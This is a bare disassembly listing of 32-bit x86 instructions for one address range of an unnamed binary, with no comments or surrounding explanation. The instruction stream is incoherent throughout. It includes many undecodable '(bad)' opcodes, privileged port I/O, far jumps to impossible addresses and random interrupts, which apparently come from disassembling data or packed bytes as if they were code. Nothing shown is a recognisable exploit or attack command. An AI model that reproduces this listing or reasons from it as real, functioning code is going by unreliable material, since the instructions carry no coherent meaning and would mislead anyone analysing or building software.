  4037da:	xor    BYTE PTR [ecx+0x60],dh
  4037dd:	dec    eax
  4037de:	and    eax,0xee88f174
  4037e3:	jb     0x403818
  4037e5:	sub    DWORD PTR [eax-0x51],0xffffffa6
  4037e9:	inc    edi
  4037ea:	outs   dx,BYTE PTR ds:[esi]
  4037eb:	in     al,0xfe
  4037ed:	lds    eax,FWORD PTR [edi+0x79]
  4037f0:	inc    ah
  4037f2:	bound  eax,QWORD PTR [ebx+0x7b]
  4037f5:	fist   DWORD PTR [edx]
  4037f7:	mov    dl,0x27
  4037f9:	xor    ecx,edi
  4037fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037fc:	and    al,0xf8
  4037fe:	or     ah,al
  403800:	or     al,BYTE PTR [esi]
  403802:	and    bh,dh
  403804:	push   0xffffffa0
  403806:	test   eax,0x9c6e4004
  40380b:	mov    cl,0x45
  40380d:	retf   
  40380e:	lea    edx,[ebp+0x6e]
  403811:	out    dx,al
  403812:	add    bh,BYTE PTR [esi+0x55]
  403815:	xor    eax,0x6495c6ed
  40381a:	int3   
  40381b:	and    edi,DWORD PTR [eax-0x65fd9b6c]
  403821:	popa   
  403822:	fdivr  DWORD PTR [edi]
  403824:	and    eax,0x7352cfc7
  403829:	sbb    ebp,edi
  40382b:	repnz aas 
  40382d:	push   0x4
  40382f:	pusha  
  403830:	pushf  
  403831:	or     al,0x5f
  403833:	scas   eax,DWORD PTR es:[edi]
  403834:	repnz aam 0x93
  403837:	(bad)  
  403838:	ror    BYTE PTR [ecx+0x11],1
  40383b:	cmp    al,0x5d
  40383d:	adc    dl,0xc7
  403840:	int    0xf
  403842:	cmp    al,0x9f
  403844:	mov    dl,BYTE PTR [eax+0x32c25dcb]
  40384a:	repz call 0x2c6b1683
  403850:	ss push ecx
  403852:	jmp    0x40388d
  403854:	call   0xf51d9679
  403859:	mov    ds:0xeb24ff0a,eax
  40385e:	mov    WORD PTR [ebx],?
  403860:	add    al,0xe3
  403862:	hlt    
  403863:	pop    ss
  403864:	mov    BYTE PTR [eax-0x5],ah
  403867:	fwait
  403868:	pushf  
  403869:	pop    esi
  40386a:	mov    eax,ds:0x6662d68
  40386f:	xor    esi,DWORD PTR [ebx-0x28c9e1f0]
  403875:	mov    al,0x26
  403877:	mov    eax,ds:0x6021ba94
  40387c:	sub    DWORD PTR [eax-0x3c],eax
  40387f:	aam    0xa3
  403881:	mov    ch,BYTE PTR [ecx]
  403883:	jp     0x4038dd
  403885:	cld    
  403886:	sub    eax,0xb59cea18
  40388b:	fldcw  WORD PTR [ebp+0x2d6ddec5]
  403891:	and    ebp,DWORD PTR [edi-0x38]
  403894:	not    esp
  403896:	inc    eax
  403897:	int3   
  403898:	loopne 0x40381c
  40389a:	popa   
  40389b:	mov    ebx,0x4fbae089
  4038a0:	mov    eax,0x50622740
  4038a5:	repnz mov bh,BYTE PTR [ebx+0x6e]
  4038a9:	scas   al,BYTE PTR es:[edi]
  4038aa:	or     dl,BYTE PTR [eax-0x48]
  4038ad:	and    DWORD PTR [ebp+0x41139f3],ebp
  4038b3:	and    dh,0x49
  4038b6:	or     esp,DWORD PTR [edx+0xd]
  4038b9:	shr    DWORD PTR [ebx+0x7e],1
  4038bc:	push   0x6e8d2485
  4038c1:	mov    ebx,0x812c53c0
  4038c6:	sbb    BYTE PTR ss:[edi+0x664d166f],0x6a
  4038ce:	hlt    
  4038cf:	stos   BYTE PTR es:[edi],al
  4038d0:	push   ebx
  4038d1:	mov    ch,0xfc
  4038d3:	and    dh,0x59
  4038d6:	cmp    dh,BYTE PTR [eax-0x2f4f6954]
  4038dc:	(bad)  ds:0x7211ebf
  4038e2:	inc    ecx
  4038e3:	fild   DWORD PTR [edi-0x42b15844]
  4038ea:	stos   DWORD PTR es:[edi],eax
  4038eb:	call   0x8a6a370d
  4038f0:	push   es
  4038f1:	test   ch,dl
  4038f3:	add    ah,dh
  4038f5:	push   ebx
  4038f6:	jecxz  0x403907
  4038f8:	and    eax,0x1edbacbe
  4038fd:	dec    eax
  4038fe:	test   BYTE PTR [eax-0x2bc3701b],0xef
  403905:	xchg   DWORD PTR [edi-0x48],ecx
  403908:	ins    BYTE PTR es:[edi],dx
  403909:	imul   ecx,DWORD PTR [esi-0x2],0xfe0625fc
  403910:	push   ebx
  403911:	mov    ds:0xdb508f50,al
  403916:	mul    BYTE PTR [eax]
  403918:	fwait
  403919:	xchg   esi,eax
  40391a:	repnz push ss
  40391c:	int    0x77
  40391e:	dec    esp
  40391f:	mov    dl,0xb5
  403921:	fstp   QWORD PTR [edx-0x3e]
  403924:	shr    DWORD PTR [esp+edx*2-0x563e2baa],cl
  40392b:	rcl    DWORD PTR [edi-0x5c],cl
  40392e:	jmp    0x1fcd:0x64e51c8b
  403935:	mov    ah,0x59
  403937:	js     0x4038ff
  403939:	pop    ebp
  40393a:	(bad)  
  40393b:	clc    
  40393c:	test   BYTE PTR [edx-0x7de7bbb3],0xc
  403943:	es cld 
  403945:	(bad)  
  403946:	ins    BYTE PTR es:[edi],dx
  403947:	cld    
  403948:	push   eax
  403949:	hlt    
  40394a:	inc    edi
  40394b:	mov    edx,0xb7914266
  403950:	stc    
  403951:	test   BYTE PTR [edi-0x10],ch
  403954:	mov    al,0xc0
  403956:	inc    esi
  403957:	xor    ebx,DWORD PTR [edi]
  403959:	dec    esp
  40395a:	fistp  WORD PTR [ebp-0xf]
  40395d:	std    
  40395e:	mul    ebp
  403960:	xchg   edi,eax
  403961:	arpl   sp,ax
  403963:	push   0x5b3972dd
  403968:	dec    edx
  403969:	sub    dh,BYTE PTR [eax]
  40396b:	fcomp  QWORD PTR [ebx]
  40396d:	rcl    DWORD PTR [ebx],cl
  40396f:	loop   0x4039e6
  403971:	cmp    bl,BYTE PTR [esp+eax*4]
  403974:	out    dx,al
  403975:	inc    edx
  403976:	(bad)  
  403977:	jmp    0xd0bf13e1
  40397c:	sbb    esi,ebp
  40397e:	jp     0x4039ec
  403980:	rcl    BYTE PTR [eax-0x75],cl
  403983:	mov    dl,0xc2
  403985:	pop    ebp
  403986:	sbb    ecx,ebp
  403988:	lock jb 0x4039e6
  40398b:	pusha  
  40398c:	popa   
  40398d:	xor    bh,BYTE PTR [edx+0xd]
  403990:	outs   dx,BYTE PTR ds:[esi]
  403991:	fisttp WORD PTR [edx+ebx*8+0x5c]
  403995:	outs   dx,DWORD PTR ds:[esi]
  403996:	mov    eax,DWORD PTR [ebx-0x1c]
  403999:	xor    esp,DWORD PTR [edx+0xc09ffb0]
  40399f:	or     BYTE PTR [edx-0x6eee451d],dl
  4039a5:	cmp    eax,0xbd0c63f0
  4039aa:	adc    al,0xe0
  4039ac:	test   BYTE PTR [ecx+0x1a],cl
  4039af:	mov    dh,0xe8
  4039b1:	jmp    0x3c1c1f42
  4039b6:	mov    ds:0x1cb999dd,eax
  4039bb:	ret    
  4039bc:	inc    ebp
  4039bd:	xchg   ebp,eax
  4039be:	repnz mov dl,0x2
  4039c1:	push   ss
  4039c2:	aaa    
  4039c3:	add    eax,0xc42b1145
  4039c8:	mov    eax,0xf4b78c6d
  4039cd:	in     eax,dx
  4039ce:	aas    
  4039cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039d0:	push   edx
  4039d1:	adc    BYTE PTR [edx-0x4],ah
  4039d4:	jge    0x40397d
  4039d6:	mov    edi,0x1cfe2f02
  4039db:	out    dx,eax
  4039dc:	pop    ds
  4039dd:	pop    ebx
  4039de:	mov    ecx,db2
  4039e1:	sbb    edi,DWORD PTR [esi+0xf]
  4039e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039e5:	and    DWORD PTR [edx],edi
  4039e7:	jns    0x4039c3
  4039e9:	scas   eax,DWORD PTR es:[edi]
  4039ea:	push   ds
  4039eb:	mov    esp,0x224c3953
  4039f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039f1:	stos   BYTE PTR es:[edi],al
  4039f2:	pop    ds
  4039f3:	sub    BYTE PTR [edx+0x2bc04ec8],0x2b
  4039fa:	int    0xa8
  4039fc:	jnp    0x403a41
  4039fe:	mov    ebx,0xd239c793
  403a03:	mov    ebx,0x83e6cc5d
  403a08:	imul   edx,DWORD PTR [ebp+0x6d],0xffffffdd
  403a0c:	in     eax,0x73
  403a0e:	ja     0x4039d2
  403a10:	push   ds
  403a11:	adc    eax,0x6b2a3792
  403a16:	sbb    esp,DWORD PTR [eax-0x23]
  403a19:	or     ebx,edx
  403a1b:	dec    ebp
  403a1c:	cwde   
  403a1d:	xor    BYTE PTR [ecx+0x7ffd24f3],bl
  403a23:	les    edx,FWORD PTR [eax-0x1f527e5f]
  403a29:	xor    eax,0x10c0ec66
  403a2e:	push   edx
  403a2f:	pop    edi
  403a30:	dec    esp
  403a31:	retf   
  403a32:	push   0xffffffd8
  403a34:	test   eax,0x21529d68
  403a39:	jbe    0x403a2d
  403a3b:	(bad)  
  403a3d:	sbb    BYTE PTR [edi+0x7dcecfa6],0x5
  403a44:	ss dec edi
  403a46:	lahf   
  403a47:	xlat   BYTE PTR ds:[ebx]
  403a48:	int    0x9f
  403a4a:	xlat   BYTE PTR ds:[ebx]
  403a4b:	xchg   ecx,ebx
  403a4d:	mov    eax,ds:0x55f5c9ce
  403a52:	xchg   edi,eax
  403a53:	xor    BYTE PTR [edx],dh
  403a55:	data16 mov WORD PTR ds:0x2767d33a,gs
  403a5c:	retf   0xb23c
  403a5f:	shr    ebp,cl
  403a61:	mov    ecx,DWORD PTR [ecx+0x4c50a284]
  403a67:	xchg   esp,eax
  403a68:	test   ebx,0x2360566
  403a6e:	adc    edi,ebp
  403a70:	push   0xffffffd6
  403a72:	ret    0xaf87
  403a75:	ror    cl,1
  403a77:	stc    
  403a78:	and    bh,bh
  403a7a:	adc    DWORD PTR [esi],ebx
  403a7c:	or     DWORD PTR gs:0x35ba4ae,edx
  403a83:	jmp    0xf9e4e7a8
  403a88:	adc    eax,0xd8e8ed14
  403a8d:	rcl    DWORD PTR [ebp-0x59],cl
  403a90:	sti    
  403a91:	hlt    
  403a92:	cmp    al,0x54
  403a94:	jno    0x403a4a
  403a96:	xor    cl,BYTE PTR [ebx-0x17d952bc]
  403a9c:	sar    DWORD PTR [ebx-0x7b],0x82
  403aa0:	bound  edi,QWORD PTR [edx]
  403aa2:	mov    ds:0x725946dd,eax
  403aa7:	add    DWORD PTR [edx+0x7a],edx
  403aaa:	ds in  al,0x88
  403aad:	addr16 loopne 0x403a6e
  403ab0:	aad    0xc
  403ab2:	inc    DWORD PTR [ebp+0x3b590e08]
  403ab8:	inc    esi
  403ab9:	loopne 0x403a7e
  403abb:	loop   0x403a64
  403abd:	outs   dx,BYTE PTR ds:[esi]
  403abe:	adc    DWORD PTR [edi],edi
  403ac0:	and    esi,DWORD PTR [eax+0xe32e6a0]
  403ac6:	pop    ebp
  403ac7:	fdivrp st(5),st
  403ac9:	lods   al,BYTE PTR ds:[esi]
  403aca:	outs   dx,BYTE PTR ds:[esi]
  403acb:	std    
  403acc:	xchg   edx,eax
  403acd:	adc    BYTE PTR [ebx+0x4f4a353e],ch
  403ad3:	aam    0xd5
  403ad5:	jae    0x403a9f
  403ad7:	mov    esi,0x17fc7d74
  403adc:	push   ds
  403add:	stos   BYTE PTR es:[edi],al
  403ade:	sbb    DWORD PTR [esi+0x3d],esi
  403ae1:	test   al,0x26
  403ae3:	fiadd  WORD PTR [ebp+0x4b]
  403ae6:	pop    ebp
  403ae7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ae8:	inc    esp
  403ae9:	les    esp,FWORD PTR [esi-0x5d6a3e76]
  403aef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403af0:	and    DWORD PTR [edi-0x1b98f899],edx
  403af6:	addr16 jne 0x403a8f
  403af9:	fsubr  QWORD PTR [ecx+0x442da7db]
  403aff:	sbb    esi,edx
  403b01:	sbb    cl,cl
  403b03:	sub    BYTE PTR [edi-0x80],dh
  403b06:	mov    ds:0xcde3c731,eax
  403b0b:	cmp    al,0x66
  403b0d:	cmp    eax,0x33390f7d
  403b12:	mov    bh,0xe6
  403b14:	dec    esp
  403b15:	push   ss
  403b16:	jl     0x403ad3
  403b18:	adc    al,0xa1
  403b1a:	add    eax,0xabae7372
  403b1f:	jnp    0x403ab3
  403b21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b22:	mov    ?,WORD PTR [ecx]
  403b24:	add    al,bh
  403b26:	les    edi,FWORD PTR [esi]
  403b28:	rol    BYTE PTR [edx-0x69784c3],1
  403b2e:	push   edi
  403b2f:	lods   al,BYTE PTR ds:[esi]
  403b30:	mov    dh,0x95
  403b32:	sbb    bh,BYTE PTR [ecx-0x3ca877f4]
  403b38:	jnp    0x403b92
  403b3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b3b:	adc    edi,DWORD PTR [edi-0x26]
  403b3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b40:	aas    
  403b41:	in     eax,dx
  403b42:	pop    ss
  403b43:	shr    BYTE PTR [ebx+0x76],1
  403b46:	and    edi,0x5d
  403b49:	sub    edi,DWORD PTR [ebp-0x1b7b7fd3]
  403b4f:	or     DWORD PTR [ebx+0x693cfa15],ecx
  403b55:	inc    edx
  403b56:	dec    esi
  403b57:	jno    0x403bb2
  403b59:	jge    0x403b50
  403b5b:	ficomp DWORD PTR [esi-0x6e960e65]
  403b61:	fidivr WORD PTR [ecx-0x18]
  403b64:	lds    edx,FWORD PTR ds:0xbb32cea1
  403b6a:	jmp    0xb9d2e2fd
  403b6f:	jae    0x403b20
  403b71:	mov    eax,ds:0x666690a3
  403b76:	(bad)  
  403b78:	retf   0x2d30
  403b7b:	sub    cl,ch
  403b7d:	in     eax,dx
  403b7e:	lock or eax,0x4e5f4e4d
  403b84:	add    BYTE PTR [ecx+0x2ec1332b],ch
  403b8a:	mov    esp,0x9979414f
  403b8f:	lea    edx,[ebx+0x50]
  403b92:	lea    edx,[edx+0x71]
  403b95:	mov    WORD PTR [edx+0xf],ss
  403b98:	mov    ebp,0xcb3d1e3c
  403b9d:	jp     0x403b6f
  403b9f:	adc    esp,DWORD PTR [ebx-0x2f]
  403ba2:	es into 
  403ba4:	out    0x10,eax
  403ba6:	(bad)  
  403ba7:	ins    BYTE PTR es:[edi],dx
  403ba8:	pop    ss
  403ba9:	or     DWORD PTR [edx],0xc7977e8
  403baf:	jecxz  0x403bb9
  403bb1:	add    ch,cl
  403bb3:	mov    edx,0x25aec086
  403bb8:	jp     0x403b41
  403bba:	fstp   TBYTE PTR [ecx]
  403bbc:	call   DWORD PTR [eax+eax*2-0x52]
  403bc0:	daa    
  403bc1:	arpl   WORD PTR [esi],di
  403bc3:	adc    eax,0xd5de338b
  403bc8:	and    al,0x30
  403bca:	pop    eax
  403bcb:	cld    
  403bcc:	adc    cl,ch
  403bce:	adc    ecx,ecx
  403bd0:	je     0x403bf8
  403bd2:	arpl   WORD PTR [ebx],dx
  403bd4:	hlt    
  403bd5:	inc    esp
  403bd6:	ja     0x403be6
  403bd8:	dec    esp
  403bd9:	xor    BYTE PTR [edx-0x28],dl
  403bdc:	outs   dx,BYTE PTR ds:[esi]
  403bdd:	xor    BYTE PTR [edx-0x6c],0x2
  403be1:	call   0x6dba:0x9c249aba
  403be8:	sbb    esi,DWORD PTR [edi]
  403bea:	fdiv   st,st(4)
  403bec:	stos   BYTE PTR es:[edi],al
  403bed:	mov    eax,ds:0xee56ba47
  403bf2:	xchg   ebx,eax
  403bf3:	out    0x5c,al
  403bf5:	cli    
  403bf6:	jb     0x403bb3
  403bf8:	jp     0x403bac
  403bfa:	sub    ah,BYTE PTR [ebx-0x68159223]
  403c00:	sbb    al,0xf3
  403c02:	mov    edi,0xdea3ec03
  403c07:	jg     0x403bbd
  403c09:	jg     0x403b9e
  403c0b:	sub    dh,BYTE PTR [eax+0x1ad4ba81]
  403c11:	push   ds
  403c12:	in     eax,0xe1
  403c14:	rol    BYTE PTR [ebp+0x56],cl
  403c17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c18:	dec    ebx
  403c19:	cld    
  403c1a:	mov    dh,0x3a
  403c1c:	in     al,0x96
  403c1e:	adc    esp,esp
  403c20:	pop    ebx
  403c21:	dec    esp
  403c22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c23:	cmp    dh,dl
  403c25:	mov    eax,ds:0x3890e3bf
  403c2a:	(bad)  
  403c2b:	retf   0x2a45
  403c2e:	xchg   esi,eax
  403c2f:	or     esp,edx
  403c31:	or     eax,0x719962af
  403c36:	inc    DWORD PTR [edx]
  403c38:	ja     0x403c64
  403c3a:	stc    
  403c3b:	jns    0x403c63
  403c3d:	xlat   BYTE PTR ds:[ebx]
  403c3e:	popa   
  403c3f:	(bad)
  403c43:	popf   
  403c44:	sahf   
  403c45:	sar    DWORD PTR ds:0x51520d9e,0x3a
  403c4c:	jp     0x403c66
  403c4e:	fs jmp 0x47d7:0xd9b22200
  403c56:	xchg   edi,eax
  403c57:	mov    eax,ds:0xa1402f75
  403c5c:	outs   dx,DWORD PTR ds:[esi]
  403c5d:	sub    BYTE PTR [bp+si+0x5b],cl
  403c61:	jb     0x403ccf
  403c63:	inc    ebx
  403c64:	jecxz  0x403c62
  403c66:	push   ebx
  403c67:	js     0x403c81
  403c69:	out    0xd6,eax
  403c6b:	and    al,0x3e
  403c6d:	dec    edx
  403c6e:	(bad)  
  403c6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c70:	into   
  403c71:	mov    ch,0xa2
  403c73:	sub    BYTE PTR [eax-0x34],dh
  403c76:	icebp  
  403c77:	lods   eax,DWORD PTR ds:[esi]
  403c78:	cld    
  403c79:	stc    
  403c7a:	inc    ebp
  403c7b:	push   esp
  403c7c:	cli    
  403c7d:	adc    DWORD PTR [esi+0x5fdeaeeb],edi
  403c83:	or     DWORD PTR [esi-0x617853b6],ecx
  403c89:	fwait
  403c8a:	jne    0x403c7f
  403c8c:	push   ebp
  403c8d:	and    BYTE PTR [ebp+0x65a4eb38],al
  403c93:	inc    edi
  403c94:	dec    ebp
  403c95:	pusha  
  403c96:	rcr    DWORD PTR [edi+0x36],0x93
  403c9a:	sbb    ch,cl
  403c9c:	push   edx
  403c9d:	push   edx
  403c9e:	ret    0xc2ab
  403ca1:	pusha  
  403ca2:	pop    ecx
  403ca3:	out    dx,eax
  403ca4:	iret   
  403ca5:	adc    edi,0x32d62121
  403cab:	and    al,0xc3
  403cad:	pop    ebx
  403cae:	mov    edx,0x57900954
  403cb3:	mov    BYTE PTR [esi],ch
  403cb5:	sbb    al,BYTE PTR [ebp-0x54]
  403cb8:	retf   
  403cb9:	js     0x403cec
  403cbb:	add    al,dh
  403cbd:	es pop esp
  403cbf:	call   0x2244fd1e
  403cc4:	stos   BYTE PTR es:[edi],al
  403cc5:	mov    bh,0xc
  403cc7:	out    0x7c,al
  403cc9:	mov    ecx,0x5fa9e2
  403cce:	mov    ebp,0x510c52ab
  403cd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cd4:	call   0xdcffc9ce
  403cd9:	push   ds
  403cda:	cmc    
  403cdb:	and    DWORD PTR [esi*1+0x7133ab87],ecx
  403ce2:	jns    0x403c79
  403ce4:	fist   WORD PTR [edi]
  403ce6:	arpl   WORD PTR [ecx-0x3b6d8aac],di
  403cec:	or     edi,DWORD PTR [ebp-0x771c3b70]
  403cf2:	pop    esp
  403cf3:	idiv   BYTE PTR [edx-0x4b]
  403cf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cf7:	adc    cl,BYTE PTR [eax+ecx*2+0x13]
  403cfb:	sbb    eax,0x6b03c56e
  403d00:	dec    esp
  403d01:	ja     0x403ccf
  403d03:	push   esi
  403d04:	(bad)  
  403d05:	fiadd  DWORD PTR [edi+0x7d]
  403d08:	xor    ebx,edx
  403d0a:	sbb    ch,ch
  403d0c:	shr    DWORD PTR [ecx+0x24def295],1
  403d12:	cli    
  403d13:	(bad)  
  403d14:	out    dx,al
  403d15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d16:	clc    
  403d17:	xlat   BYTE PTR ds:[ebx]
  403d18:	dec    ebx
  403d19:	fcmovnb st,st(2)
  403d1b:	in     al,0xdb
  403d1d:	inc    ecx
  403d1e:	test   eax,0xe259810f
  403d23:	mov    ebx,0x805d14e9
  403d28:	adc    ah,BYTE PTR ds:[ecx+0x65e5c438]
  403d2f:	jmp    0x2076:0x778a99b3
  403d36:	outs   dx,BYTE PTR ds:[esi]
  403d37:	or     esi,DWORD PTR [ecx]
  403d39:	int3   
  403d3a:	sahf   
  403d3b:	enter  0x82e7,0xb4
  403d3f:	sub    BYTE PTR [esi+0x7f99f85b],cl
  403d45:	sbb    cl,bl
  403d47:	lock dec ecx
  403d49:	lds    ecx,FWORD PTR ds:0xd505b884
  403d4f:	push   0x55b4e2a6
  403d54:	leave  
  403d55:	lds    ebx,FWORD PTR [ecx+0x3d30636c]
  403d5b:	call   0xacbdec2b
  403d60:	mov    bl,0x1
  403d62:	add    cl,bh
  403d64:	int    0xb8
  403d66:	pop    ds
  403d67:	bnd jge 0x403d82
  403d6a:	popa   
  403d6b:	push   ebp
  403d6c:	cld    
  403d6d:	loope  0x403d05
  403d6f:	test   eax,0xb15022fc
  403d74:	fisttp DWORD PTR [eax+0x5912c31a]
  403d7a:	enter  0xdb7e,0x26
  403d7e:	scas   eax,DWORD PTR es:[edi]
  403d7f:	xchg   DWORD PTR [eax-0x32],ebp
  403d82:	dec    ebx
  403d83:	dec    DWORD PTR [eax+0x40]
  403d86:	ud0    ebp,DWORD PTR [ecx]
  403d89:	pop    ebx
  403d8a:	(bad)  
  403d8b:	idiv   eax
  403d8d:	cs mov edi,DWORD PTR es:[ecx+0x30e024cc]
  403d95:	push   ss
  403d96:	jl     0x403d4e
  403d98:	sbb    al,0x2e
  403d9a:	sar    BYTE PTR [edi+0x55],cl
  403d9d:	int    0x15
  403d9f:	sub    eax,0xc1438475
  403da4:	mov    BYTE PTR [edi+0x51f5e63b],bl
  403daa:	shl    ah,cl
  403dac:	repz jns 0x403d6d
  403daf:	sub    DWORD PTR [edi],0xffffffe4
  403db2:	out    0xff,al
  403db4:	cmp    DWORD PTR [ebx],0x15
  403db7:	xor    DWORD PTR [ebp-0x6a],edx
  403dba:	out    dx,eax
  403dbb:	shl    DWORD PTR [edi+0xfe9e90d],cl
  403dc1:	call   0x28489f5f
  403dc6:	stc    
  403dc7:	in     al,dx
  403dc8:	das    
  403dc9:	jle    0x403d90
  403dcb:	push   edi
  403dcc:	or     BYTE PTR [ecx-0x67e7d4bc],dh
  403dd2:	sub    ecx,DWORD PTR [eax-0xf52996d]
  403dd8:	lock pop ss
  403dda:	push   ebp
  403ddb:	out    dx,al
  403ddc:	xchg   ebp,eax
  403ddd:	cdq    
  403dde:	xor    edx,DWORD PTR [eax]
  403de0:	mov    al,ds:0x13fde6c
  403de5:	mov    al,ds:0xd0709ef
  403dea:	retf   
  403deb:	mov    eax,0x542613d4
  403df0:	stc    
  403df1:	cmp    ebx,DWORD PTR [edi+0x20]
  403df4:	mov    edx,0x3d262439
  403df9:	nop
  403dfa:	repnz dec esp
  403dfc:	fistp  DWORD PTR [ebp+eiz*4-0x4d0c7c2]
  403e03:	and    eax,0xb868ffc3
  403e08:	rol    BYTE PTR [edx-0x2c0baf40],0xc3
  403e0f:	sbb    al,0xd7
  403e11:	add    DWORD PTR [esi+0x24],esi
  403e14:	jecxz  0x403e1b
  403e16:	xchg   edi,eax
  403e17:	add    dh,dh
  403e19:	cwde   
  403e1a:	and    al,0x2a
  403e1c:	aas    
  403e1d:	inc    ecx
  403e1e:	xor    ebx,0x321dbd78
  403e24:	sub    ebp,DWORD PTR [ecx+0x7d]
  403e27:	std    
  403e28:	mov    bl,0xf9
  403e2a:	mov    dh,BYTE PTR ds:0x88ad3b5a
  403e30:	push   eax
  403e31:	ja     0x403e0b
  403e33:	int    0xda
  403e35:	mov    bh,0xcf
  403e37:	test   BYTE PTR [eax],al
  403e39:	push   es
  403e3a:	jb     0x403e1a
  403e3c:	cmp    BYTE PTR [esi-0x8],0xf7
  403e40:	push   0x11
  403e42:	mov    gs,eax
  403e44:	js     0x403df1
  403e46:	pop    edi
  403e47:	shr    ebp,1
  403e49:	and    eax,0xb4e6ef71
  403e4e:	mov    eax,DWORD PTR ds:0x10057d8f
  403e54:	jnp    0x403e6b
  403e56:	add    dh,BYTE PTR [edi+eax*1]
  403e59:	dec    ebx
  403e5a:	cwde   
  403e5b:	dec    ecx
  403e5c:	retf   
  403e5d:	imul   eax,DWORD PTR [edi+ecx*2],0x54
  403e61:	lea    edx,[edi+0x6f]
  403e64:	xor    esi,edi
  403e66:	aam    0xc0
  403e68:	mov    dh,0x5c
  403e6a:	pop    edx
  403e6b:	or     eax,0xa1d2e4d0
  403e70:	add    DWORD PTR [edx+eiz*4-0x21],ecx
  403e74:	inc    edx
  403e75:	cmp    eax,0x4a8e275b
  403e7a:	aad    0x2c
  403e7c:	mov    esi,0x97e91b23
  403e81:	mov    dh,0x7c
  403e83:	std    
  403e84:	ins    DWORD PTR es:[edi],dx
  403e85:	or     al,0xb0
  403e87:	ins    BYTE PTR es:[edi],dx
  403e88:	ret    0xbc75
  403e8b:	jbe    0x403ef2
  403e8d:	out    0xc1,al
  403e8f:	out    0xa4,eax
  403e91:	pop    edx
  403e92:	loope  0x403ecb
  403e94:	retf   0xfa04
  403e97:	arpl   WORD PTR [edi-0x552b1c91],dx
  403e9d:	dec    esi
  403e9e:	test   al,0x1b
  403ea0:	pop    esi
  403ea1:	push   DWORD PTR [ecx-0x1bfea288]
  403ea7:	adc    eax,0x6544444
  403eac:	jl     0x403e31
  403eae:	ins    DWORD PTR es:[edi],dx
  403eaf:	repz js 0x403ec7
  403eb2:	xor    eax,0xacab5d20
  403eb7:	stc    
  403eb8:	clc    
  403eb9:	pop    edi
  403eba:	out    dx,eax
  403ebb:	fbld   TBYTE PTR [edi-0x3b]
  403ebe:	sub    DWORD PTR [edi-0x20f59135],0xffffffda
  403ec5:	ror    dh,1
  403ec7:	outs   dx,DWORD PTR ds:[esi]
  403ec8:	mov    ebx,0xfc8374bb
  403ecd:	push   esi
  403ece:	fld1   
  403ed0:	fild   DWORD PTR [ecx+edi*4]
  403ed3:	shr    DWORD PTR ds:0xd18cb0d1,0x36
  403eda:	mov    dl,0x74
  403edc:	pop    ecx
  403edd:	jge    0x403f52
  403edf:	add    DWORD PTR [ebp-0x58e77105],eax
  403ee5:	int    0x77
  403ee7:	add    ecx,ebx
  403ee9:	sbb    eax,0xc5daff19
  403eee:	cmp    al,0x4d
  403ef0:	(bad)  [esp+eiz*8+0x3fac3113]
  403ef7:	push   0xffffffca
  403ef9:	stc    
  403efa:	addr16 ja 0x403ea2
  403efd:	leave  
  403efe:	push   ecx
  403eff:	pusha  
  403f00:	sub    al,0x77
  403f02:	cs jp  0x403e8b
  403f05:	aad    0x12
  403f07:	jle    0x403f44
  403f09:	lahf   
  403f0a:	push   ds
  403f0b:	jbe    0x403f80
  403f0d:	aaa    
  403f0e:	fwait
  403f0f:	xor    esi,DWORD PTR [edx]
  403f11:	int    0xc4
  403f13:	aas    
  403f14:	mov    ah,0x30
  403f16:	adc    al,0x91
  403f18:	outs   dx,BYTE PTR ds:[esi]
  403f19:	mov    dl,dl
  403f1b:	cmp    BYTE PTR [edx+ebp*1],0x2b
  403f1f:	(bad)  
  403f20:	imul   edx,DWORD PTR [edi+eiz*2+0x46],0xffffff85
  403f25:	adc    eax,0x22a2f5f7
  403f2a:	das    
  403f2b:	clc    
  403f2c:	sub    eax,0xf363c3a
  403f31:	sbb    esp,DWORD PTR [edi-0xfb98c6e]
  403f37:	xor    edi,DWORD PTR [ecx+0x50]
  403f3a:	das    
  403f3b:	(bad)  
  403f3c:	loopne 0x403ed9
  403f3e:	and    BYTE PTR [ecx+0x22],0xb2
  403f42:	sbb    BYTE PTR [esi+0x39],ah
  403f45:	(bad)  
  403f46:	push   ss
  403f47:	mov    eax,ds:0xb24a37a6
  403f4c:	ja     0x403f59
  403f4e:	ss lahf 
  403f50:	sbb    bh,dh
  403f52:	xchg   ecx,eax
  403f53:	add    eax,0x24765023
  403f58:	hlt    
  403f59:	pop    es
  403f5a:	pop    edx
  403f5b:	cdq    
  403f5c:	bnd jl 0x403f4c
  403f5f:	sub    cl,BYTE PTR [ebp-0x40e6a060]
  403f65:	push   eax
  403f66:	jo     0x403f0a
  403f68:	sub    BYTE PTR [edx+0x69],dl
  403f6b:	xor    DWORD PTR [ebx-0x7262635c],esi
  403f71:	sbb    BYTE PTR [edx-0x569a3456],0x80
  403f78:	inc    edi
  403f79:	mov    ebp,0xf00dd1e9
  403f7e:	sbb    al,0xd4
  403f80:	leave  
  403f81:	cmp    bl,ah
  403f83:	pop    esi
  403f84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f85:	jns    0x403fd7
  403f87:	sub    ah,ch
  403f89:	cwde   
  403f8a:	shl    BYTE PTR [ebp+0xfa27173],1
  403f90:	(bad)  
  403f91:	mov    bh,0x61
  403f93:	lods   eax,DWORD PTR ds:[esi]
  403f94:	pop    eax
  403f95:	xchg   ecx,eax
  403f96:	sbb    al,0xe8
  403f98:	mov    DWORD PTR [esi+0x3e6ccb2],eax
  403f9e:	sbb    BYTE PTR [esp+ebp*4],dl
  403fa1:	pop    ss
  403fa2:	mov    cl,0x97
  403fa4:	jp     0x403f8f
  403fa6:	in     al,0xbd
  403fa8:	inc    ebp
  403fa9:	jns    0x403fa1
